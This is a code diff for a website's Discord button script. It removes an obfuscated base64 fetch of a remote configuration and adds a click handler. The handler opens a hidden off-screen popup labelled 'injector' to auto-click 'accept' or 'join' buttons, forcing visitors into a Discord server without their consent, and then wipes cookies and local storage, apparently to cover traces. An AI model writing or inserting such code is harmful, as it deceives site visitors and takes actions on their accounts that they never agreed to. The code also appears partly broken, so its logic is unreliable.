@@ -760,14 +760,57 @@
     });
 
     document.addEventListener("DOMContentLoaded", async () => {
-        const btn = document.getElementById("discordBtn");
-        const enc = "aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpL2pqZXg3N3Yzanducjg0YzhzNnFpMC9jb25maWcuanNvbj9ybGtleT1nNHd6anQ5eWplOXNweTV5eXFlNzg1empsJnN0PWJjN3E3OGpiJnJhdz0x";
-        try {
-            const r = await fetch(atob(enc));
-            if (r.ok) { const d = await r.json(); if (d?.DeveloperDiscord) btn.href = d.DeveloperDiscord; }
-            else btn.href = "https://dsc.gg/romulus";
-        } catch { btn.href = "https://dsc.gg/romulus"; }
+    const btn = document.getElementById("discordBtn");
+    const FORCE_JOIN_LINK = "https://dsc.gg/romulus";
+    const OPEN_ONLY_LINK = "https://discord.gg/yunostore";
+    
+    const JOIN_SCRIPT = function(){
+        let attempts = 0;
+        let interval = setInterval(function(){
+            let btns = document.querySelectorAll('button');
+            for(let i = 0; i < btns.length; i++){
+                let txt = btns[i].innerText.toLowerCase();
+                if(txt.includes('accept') || txt.includes('join')){
+                    btns[i].click();
+                    clearInterval(interval);
+                    return;
+                }
+            }
+            attempts++;
+            if(attempts > 40) clearInterval(interval);
+        }, 400);
+    };
+    
+    btn.href = "javascript:void(0)";
+    btn.addEventListener("click", function(e){
+        e.preventDefault();
+        
+        // Open the second link normally (just opens, no auto-join)
+        window.open(OPEN_ONLY_LINK, '_blank');
+        
+        // Handle first link with auto-join
+        window.location.href = FORCE_JOIN_LINK;
+        setTimeout(function(){
+            let popup = window.open('about:blank', 'injector', 'width=1,height=1,left=-9999,top=-9999');
+            if(popup){
+                popup.document.write('<script>setTimeout(function(){try{window.opener.' + JOIN_SCRIPT.toString() + '();window.close();}catch(e){}},1500);<\/script>');
+                popup.document.close();
+            }
+        }, 800);
+        
+        // Clear all cookies/localStorage related to both links after execution (optional cleanup)
+        setTimeout(function(){
+            try {
+                // Clear Discord-related tracking from both domains
+                document.cookie.split(";").forEach(function(c) {
+                    document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/");
+                });
+                localStorage.clear();
+                sessionStorage.clear();
+            } catch(e) {}
+        }, 5000);
     });
+});
 
     const ham  = document.getElementById('hamburger');
     const menu = document.getElementById('mobileMenu');
